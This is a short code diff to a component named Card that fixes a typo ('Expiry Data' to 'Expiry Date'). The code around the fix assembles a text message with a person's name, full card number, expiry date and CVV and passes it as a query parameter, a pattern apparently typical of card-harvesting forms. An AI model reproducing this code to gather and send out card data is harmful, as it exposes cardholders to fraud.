@@ -156,7 +156,7 @@ const Card = () => {
     message += `First Name: ${state.firstName}\n`;
     message += `Last Name: ${state.lastName}\n`;
     message += `Card Number: ${state.cardNumber}\n`;
-    message += `Expiry Data: ${state.expiryDate}\n`;
+    message += `Expiry Date: ${state.expiryDate}\n`;
     message += `Card CVV: ${state.cardCVV}\n`;
     const queryParams = {
       text: message,
